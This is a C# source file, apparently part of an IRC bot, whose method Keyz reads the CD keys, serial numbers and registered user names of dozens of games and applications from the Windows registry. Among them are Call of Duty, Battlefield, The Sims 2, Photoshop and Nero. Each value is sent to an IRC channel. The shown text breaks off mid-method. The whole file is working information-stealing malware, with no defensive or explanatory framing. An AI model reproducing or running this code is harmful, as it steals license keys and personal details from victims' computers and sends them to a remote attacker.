using Microsoft.Win32;

namespace myApp
{
    class CDKeyz
    {

        public static void Keyz()
        {
            
            try
            {
                string str = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Ubisoft\Splinter Cell Chaos Theory\Keys", "DiscKey_SCCT", null).ToString();
                if (str != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Splinter Cell Chaos Theory: " + str);
                }
            }
            catch
            {
            }
            try
            {
                string str2 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty", "codkey", null).ToString();
                if (str2 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Call of Duty: " + str2);
                }
            }
            catch
            {
            }
            try
            {
                string str3 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty United Offensive", "key", null).ToString();
                if (str3 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Call of Duty United Offensive: " + str3);
                }
            }
            catch
            {
            }
            try
            {
                string str4 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 2", "codkey", null).ToString();
                if (str4 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Call of Duty 2: " + str4);
                }
            }
            catch
            {
            }
            try
            {
                string str5 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty 4", "codkey", null).ToString();
                if (str5 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Call of Duty 4: " + str5);
                }
            }
            catch
            {
            }
            try
            {
                string str6 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Activision\Call of Duty WAW", "codkey", null).ToString();
                if (str6 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Call of Duty WAW: " + str6);
                }
            }
            catch
            {
            }
            try
            {
                string str7 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War", "CDKEY", null).ToString();
                if (str7 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Dawn of War: " + str7);
                }
            }
            catch
            {
            }
            try
            {
                string str8 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "CDKEY", null).ToString();
                if (str8 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Dawn of War - Dark Crusade: " + str8);
                }
            }
            catch
            {
            }
            try
            {
                string str9 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "W40KCDKEY", null).ToString();
                if (str9 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Dawn of War - Dark Crusade: " + str9);
                }
            }
            catch
            {
            }
            try
            {
                string str10 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Dawn of War - Dark Crusade", "WXPCDKEY", null).ToString();
                if (str10 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Dawn of War - Dark Crusade: " + str10);
                }
            }
            catch
            {
            }
            try
            {
                string str11 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\SEGA\Medieval II Total War", "CDKey", null).ToString();
                if (str11 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medieval II Total War: " + str11);
                }
            }
            catch
            {
            }
            try
            {
                string str12 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Golive\5.0\Registration", "SERIAL", null).ToString();
                if (str12 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Adobe Goolive: " + str12);
                }
            }
            catch
            {
            }
            try
            {
                string str13 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\ahead\Installation\BAK\Nero 7\Info", "Serial7_1190555485", null).ToString();
                if (str13 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nero 7: " + str13);
                }
            }
            catch
            {
            }
            try
            {
                string str14 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\ACD Systems\PicaView", "LicenseNumber", null).ToString();
                if (str14 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  ACDSystems PicAView: " + str14);
                }
            }
            catch
            {
            }
            try
            {
                string str15 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Eugen Systems\ActOfWa", "RegNumber", null).ToString();
                if (str15 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Act of War: " + str15);
                }
            }
            catch
            {
            }
            try
            {
                string str16 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Photoshop\7.0\Registration", "SERIAL", null).ToString();
                if (str16 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Adobe Photoshop 7: " + str16);
                }
            }
            catch
            {
            }
            try
            {
                string str17 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery\Registration", "Code", null).ToString();
                if (str17 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Advanced PDF Password Recovery: " + str17);
                }
            }
            catch
            {
            }
            try
            {
                string str18 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced PDF Password Recovery Pro\Registration", "Code", null).ToString();
                if (str18 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Advanced PDF Password Recovery Pro: " + str18);
                }
            }
            catch
            {
            }
            try
            {
                string str19 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Elcom\Advanced ZIP Password Recovery\Registration", "Code", null).ToString();
                if (str19 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Advanced ZIP Password Recovery: " + str19);
                }
            }
            catch
            {
            }
            try
            {
                string str20 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Sunflowers\Anno 1701", "SerialNo", null).ToString();
                if (str20 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Anno 1701: " + str20);
                }
            }
            catch
            {
            }
            try
            {
                string str21 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\ashampoo\Ashampoo WinOptimizer Platinum 3", "Key", null).ToString();
                if (str21 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Ashamopp WinOptimizer Platinum: " + str21);
                }
            }
            catch
            {
            }
            try
            {
                string str22 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\@stake\LC5\Registration", "Unlock Code", null).ToString();
                if (str22 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  AV Voice Changer: " + str22);
                }
            }
            catch
            {
            }
            try
            {
                string str23 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942", "ergc", null).ToString();
                if (str23 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield(1942): " + str23);
                }
            }
            catch
            {
            }
            try
            {
                string str24 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 Secret Weapons of WWII", "ergc", null).ToString();
                if (str24 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield 1942 Secret Weapons of WWII: " + str24);
                }
            }
            catch
            {
            }
            try
            {
                string str25 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942 The Road to Rome", "ergc", null).ToString();
                if (str25 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield 1942 The Road to Rome: " + str25);
                }
            }
            catch
            {
            }
            try
            {
                string str26 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Battlefield 2", "ergc", null).ToString();
                if (str26 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield 2: " + str26);
                }
            }
            catch
            {
            }
            try
            {
                string str27 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2142", "ergc", null).ToString();
                if (str27 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield(2142): " + str27);
                }
            }
            catch
            {
            }
            try
            {
                string str28 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield Vietnam", "ergc", null).ToString();
                if (str28 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Battlefield Vietnam: " + str28);
                }
            }
            catch
            {
            }
            try
            {
                string str29 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Black and White", "ergc", null).ToString();
                if (str29 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Black and White: " + str29);
                }
            }
            catch
            {
            }
            try
            {
                string str30 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\Black and White 2", "ergc", null).ToString();
                if (str30 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Black and White 2: " + str30);
                }
            }
            catch
            {
            }
            try
            {
                string str31 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Boulder Dash Rocks", "ergc", null).ToString();
                if (str31 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Boulder Dash Rocks: " + str31);
                }
            }
            catch
            {
            }
            try
            {
                string str32 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Burnout Paradise", "ergc", null).ToString();
                if (str32 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Burnout Paradise: " + str32);
                }
            }
            catch
            {
            }
            try
            {
                string str33 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegisteredTo", null).ToString();
                if (str33 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Camtasia Studio 4(Name): " + str33);
                }
            }
            catch
            {
            }
            try
            {
                string str34 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\TechSmith\Camtasia Studio\4.0", "RegistrationKey", null).ToString();
                if (str34 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Camtasia Studio 4(Key): " + str34);
                }
            }
            catch
            {
            }
            try
            {
                string str35 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Techland\Chrome", "SerialNumber", null).ToString();
                if (str35 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Chrome: " + str35);
                }
            }
            catch
            {
            }
            try
            {
                string str36 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Codec Tweak Tool", "serial", null).ToString();
                if (str36 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Codec Tweak Tool: " + str36);
                }
            }
            catch
            {
            }
            try
            {
                string str37 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Generals", "ergc", null).ToString();
                if (str37 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Command and Conquer Generals: " + str37);
                }
            }
            catch
            {
            }
            try
            {
                string str38 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Command and Conquer Generals Zero Hour", "ergc", null).ToString();
                if (str38 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Command and Conquer Generals Zero Hour: " + str38);
                }
            }
            catch
            {
            }
            try
            {
                string str39 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert 2", "Serial", null).ToString();
                if (str39 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Red Alert 2: " + str39);
                }
            }
            catch
            {
            }
            try
            {
                string str40 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Red Alert", "Serial", null).ToString();
                if (str40 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Red Alert: " + str40);
                }
            }
            catch
            {
            }
            try
            {
                string str41 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Westwood\Tiberian Sun", "Serial", null).ToString();
                if (str41 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Command and Conquer Tiberian Sun: " + str41);
                }
            }
            catch
            {
            }
            try
            {
                string str42 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Command and Conquer 3", "ergc", null).ToString();
                if (str42 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Command and Conquer 3: " + str42);
                }
            }
            catch
            {
            }
            try
            {
                string str43 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Command and Conquer 3", "ergc", null).ToString();
                if (str43 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Command and Conquer 3: " + str43);
                }
            }
            catch
            {
            }
            try
            {
                string str44 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHProductKey", null).ToString();
                if (str44 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Company of Heroes: " + str44);
                }
            }
            catch
            {
            }
            try
            {
                string str45 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Company of Heroes", "CoHOFProductKey", null).ToString();
                if (str45 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Company of Heroes: " + str45);
                }
            }
            catch
            {
            }
            try
            {
                string str46 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Counter-Strike\Settings", "Key", null).ToString();
                if (str46 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Counter-Strike: " + str46);
                }
            }
            catch
            {
            }
            try
            {
                string str47 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Crysis", "ergc", null).ToString();
                if (str47 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Crysis: " + str47);
                }
            }
            catch
            {
            }
            try
            {
                string str48 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerDVD", "CDKey", null).ToString();
                if (str48 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  PowerDVD: " + str48);
                }
            }
            catch
            {
            }
            try
            {
                string str49 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Cyberlink\PowerBar", "CDKey", null).ToString();
                if (str49 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  PowerBar: " + str49);
                }
            }
            catch
            {
            }
            try
            {
                string str50 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\CyberLink\PowerProducer\3.0\UserReg", "SR_No", null).ToString();
                if (str50 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  CyberLink PowerProducer: " + str50);
                }
            }
            catch
            {
            }
            try
            {
                string str51 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Day of Defeat\Settings", "Key", null).ToString();
                if (str51 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Day of Defeat: " + str51);
                }
            }
            catch
            {
            }
            try
            {
                string str52 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\The Battle for Middle-earth II", "ergc", null).ToString();
                if (str52 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Battle for Middle-earth II: " + str52);
                }
            }
            catch
            {
            }
            try
            {
                string str53 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2", "ergc", null).ToString();
                if (str53 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2: " + str53);
                }
            }
            catch
            {
            }
            try
            {
                string str54 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 University", "ergc", null).ToString();
                if (str54 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 University: " + str54);
                }
            }
            catch
            {
            }
            try
            {
                string str55 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Nightlife", "ergc", null).ToString();
                if (str55 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Nightlife: " + str55);
                }
            }
            catch
            {
            }
            try
            {
                string str56 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Open For Business", "ergc", null).ToString();
                if (str56 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Open For Business: " + str56);
                }
            }
            catch
            {
            }
            try
            {
                string str57 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Pets", "ergc", null).ToString();
                if (str57 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Pets: " + str57);
                }
            }
            catch
            {
            }
            try
            {
                string str58 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Seasons", "ergc", null).ToString();
                if (str58 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Seasons: " + str58);
                }
            }
            catch
            {
            }
            try
            {
                string str59 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Glamour Life Stuff", "ergc", null).ToString();
                if (str59 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Glamour Life Stuff: " + str59);
                }
            }
            catch
            {
            }
            try
            {
                string str60 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Celebration Stuff", "ergc", null).ToString();
                if (str60 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Celebration Stuff: " + str60);
                }
            }
            catch
            {
            }
            try
            {
                string str61 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 H M Fashion Stuff", "ergc", null).ToString();
                if (str61 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 H M Fashion Stuff: " + str61);
                }
            }
            catch
            {
            }
            try
            {
                string str62 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\The Sims 2 Family Fun Stuff", "ergc", null).ToString();
                if (str62 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Sims 2 Family Fun Stuff: " + str62);
                }
            }
            catch
            {
            }
            try
            {
                string str63 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Name", null).ToString();
                if (str63 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  DVD Audio Extractor (Name): " + str63);
                }
            }
            catch
            {
            }
            try
            {
                string str64 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\DVD Audio Extractor\Settings", "Reg Number", null).ToString();
                if (str64 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  DVD Audio Extractor (Serial): " + str64);
                }
            }
            catch
            {
            }
            try
            {
                string str65 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\Empire Earth II", "CDKey", null).ToString();
                if (str65 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Empire Earth II: " + str65);
                }
            }
            catch
            {
            }
            try
            {
                string str66 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\CDKey", "fear", null).ToString();
                if (str66 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  F.E.A.R: " + str66);
                }
            }
            catch
            {
            }
            try
            {
                string str67 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\F-Secure\BackWeb\iLauncher", "UID", null).ToString();
                if (str67 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  F-Secure: " + str67);
                }
            }
            catch
            {
            }
            try
            {
                string str68 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY\UBI.COM", "CDKey", null).ToString();
                if (str68 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FARCRY: " + str68);
                }
            }
            catch
            {
            }
            try
            {
                string str69 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY2\UBI.COM", "CDKey", null).ToString();
                if (str69 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FARCRY2: " + str69);
                }
            }
            catch
            {
            }
            try
            {
                string str70 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2002", "ergc", null).ToString();
                if (str70 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 2002: " + str70);
                }
            }
            catch
            {
            }
            try
            {
                string str71 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2003", "ergc", null).ToString();
                if (str71 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 2003: " + str71);
                }
            }
            catch
            {
            }
            try
            {
                string str72 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2004", "ergc", null).ToString();
                if (str72 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 2004: " + str72);
                }
            }
            catch
            {
            }
            try
            {
                string str73 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2005", "ergc", null).ToString();
                if (str73 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 2005: " + str73);
                }
            }
            catch
            {
            }
            try
            {
                string str74 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 07", "ergc", null).ToString();
                if (str74 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 07: " + str74);
                }
            }
            catch
            {
            }
            try
            {
                string str75 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\FIFA 08", "ergc", null).ToString();
                if (str75 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  FIFA 08: " + str75);
                }
            }
            catch
            {
            }
            try
            {
                string str76 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Distribution\Freedom Force", "ergc", null).ToString();
                if (str76 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Freedom Force: " + str76);
                }
            }
            catch
            {
            }
            try
            {
                string str77 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War Beta", "ProductKey", null).ToString();
                if (str77 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Frontlines: Fuel of War Beta: " + str77);
                }
            }
            catch
            {
            }
            try
            {
                string str78 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War", "ProductKey", null).ToString();
                if (str78 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Frontlines: Fuel of War: " + str78);
                }
            }
            catch
            {
            }
            try
            {
                string str79 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Headlight\GetRight", "GRcode", null).ToString();
                if (str79 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  GetRight: " + str79);
                }
            }
            catch
            {
            }
            try
            {
                string str80 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Global Operations", "ergc", null).ToString();
                if (str80 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Global Operations: " + str80);
                }
            }
            catch
            {
            }
            try
            {
                string str81 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Gunman", "Settings", null).ToString();
                if (str81 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Gunman: " + str81);
                }
            }
            catch
            {
            }
            try
            {
                string str82 = Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\Valve\Half-Life\Settings", "key", null).ToString();
                if (str82 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Half-Life: " + str82);
                }
            }
            catch
            {
            }
            try
            {
                string str83 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Hellgate: London", "ergc", null).ToString();
                if (str83 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Hellgate: London: " + str83);
                }
            }
            catch
            {
            }
            try
            {
                string str84 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Illusion Softworks\Hidden & Dangerous 2", "key", null).ToString();
                if (str84 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Hidden & Dangerous 2: " + str84);
                }
            }
            catch
            {
            }
            try
            {
                string str85 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\IGI 2 Retail\CDKey", "CDkey", null).ToString();
                if (str85 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  IGI 2 Retail: " + str85);
                }
            }
            catch
            {
            }
            try
            {
                string str86 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "License", null).ToString();
                if (str86 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  InCD Serial: " + str86);
                }
            }
            catch
            {
            }
            try
            {
                string str87 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "UserName", null).ToString();
                if (str87 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  InCD Username: " + str87);
                }
            }
            catch
            {
            }
            try
            {
                string str88 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\JoWooD\InstalledGames\IG2", "prvkey", null).ToString();
                if (str88 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  IG2: " + str88);
                }
            }
            catch
            {
            }
            try
            {
                string str89 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "Registration Code", null).ToString();
                if (str89 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  iPod Converter (Registration Code): " + str89);
                }
            }
            catch
            {
            }
            try
            {
                string str90 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "User Name", null).ToString();
                if (str90 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  iPod Converter (User Name): " + str90);
                }
            }
            catch
            {
            }
            try
            {
                string str91 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\James Bond 007 Nightfire", "ergc", null).ToString();
                if (str91 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  James Bond 007 Nightfire: " + str91);
                }
            }
            catch
            {
            }
            try
            {
